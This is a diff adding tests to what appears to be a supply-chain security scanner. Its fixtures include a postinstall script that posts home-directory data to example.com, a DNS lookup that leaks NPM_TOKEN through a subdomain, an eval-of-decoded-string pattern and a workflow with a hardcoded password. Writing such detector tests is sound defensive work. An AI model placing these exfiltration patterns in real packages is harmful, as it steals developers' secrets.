@@ -278,3 +278,71 @@ test("SARIF output has rules, results and severities", async () => {
   assert.equal(s.runs[0].tool.driver.rules[res.ruleIndex].properties["security-severity"], "9.5");
   assert.ok(res.partialFingerprints.primaryLocationLineHash);
 });
+
+test("install-time files that combine network and secrets are flagged", async () => {
+  const dir = project({
+    "package.json": JSON.stringify({ name: "x", scripts: { postinstall: "node scripts/setup.js" } }),
+    "scripts/setup.js": "const https = require('https');\nconst data = JSON.stringify({ home: require('os').homedir(), env: process.env.HOME });\nhttps.request({ host: 'example.com', method: 'POST' }).end(data);\n",
+    "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/a": { version: "1.0.0", resolved: "https://registry.npmjs.org/a/-/a-1.0.0.tgz", hasInstallScript: true } } }),
+  });
+  const r = await run(dir);
+  assert.ok(rules(r).has("install-time-capabilities"));
+  assert.ok(rules(r).has("supply-hardening"));
+  const hardened = project({
+    "package.json": JSON.stringify({ name: "y", pnpm: { onlyBuiltDependencies: ["esbuild"] } }),
+    "pnpm-lock.yaml": "lockfileVersion: '9.0'\n",
+    "pnpm-workspace.yaml": "minimumReleaseAge: 1440\n",
+  });
+  assert.ok(!rules(await run(hardened)).has("supply-hardening"));
+});
+
+test("zizmor-style workflow checks", async () => {
+  const dir = project({ ".github/workflows/r.yml": [
+    "on: [pull_request]",
+    "jobs:",
+    "  b:",
+    "    runs-on: [self-hosted, linux]",
+    "    container:",
+    "      image: ghcr.io/x/y:1",
+    "      credentials:",
+    "        username: me",
+    "        password: hunter22",
+    "    steps:",
+    "      - uses: actions/checkout@v4",
+    "      - uses: tj-actions/changed-files@v45",
+    "      - run: npm publish",
+    "        env:",
+    "          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
+    "      - uses: actions/upload-artifact@v4",
+    "        with: { path: . }",
+  ].join("\n") });
+  const r = await run(dir);
+  for (const id of ["gha-persisted-credentials", "gha-default-permissions", "gha-self-hosted-untrusted", "gha-hardcoded-registry-password", "gha-once-compromised-action", "gha-long-lived-publish-token"]) assert.ok(rules(r).has(id), id);
+});
+
+test("baseline hides known findings and keeps new ones", async () => {
+  const dir = project({ "a.js": j("eval(at", "ob(x));\n") });
+  const first = await run(dir);
+  const base = path.join(dir, "..", path.basename(dir) + "-baseline.json");
+  fs.writeFileSync(base, JSON.stringify(first));
+  fs.writeFileSync(path.join(dir, "a.js"), "// a comment that moves the line\n" + j("eval(at", "ob(x));\n"));
+  fs.writeFileSync(path.join(dir, "b.js"), j("eval(at", "ob(y));\n"));
+  const next = await run(dir, { baseline: base });
+  assert.deepEqual(next.findings.filter(f => f.rule === "mal-eval-decoded").map(f => f.file), ["b.js"]);
+  assert.equal(next.stats.baselined, first.findings.length);
+});
+
+test("MCP lock reports servers that change after approval", async () => {
+  const dir = project({ ".mcp.json": JSON.stringify({ mcpServers: { tool: { command: "npx", args: ["-y", "tool@1.0.0"] } } }) });
+  const lock = path.join(dir, "..", path.basename(dir) + "-mcp.lock");
+  assert.match((await run(dir, { mcpLock: lock })).stats.mcpLock, /created/);
+  assert.equal((await run(dir, { mcpLock: lock })).stats.mcpLock, "unchanged");
+  fs.writeFileSync(path.join(dir, ".mcp.json"), JSON.stringify({ mcpServers: { tool: { command: "npx", args: ["-y", "tool@1.0.1"] }, extra: { command: "node", args: ["x.js"] } } }));
+  const r = await run(dir, { mcpLock: lock });
+  assert.ok(rules(r).has("mcp-changed") && rules(r).has("mcp-new-server"));
+});
+
+test("DNS exfiltration", async () => {
+  const r = await run(project({ "x.js": "dns.resolve(`${process.env.NPM_TOKEN}.x.example.com`, () => {});\n" }));
+  assert.ok(rules(r).has("mal-dns-exfil"));
+});
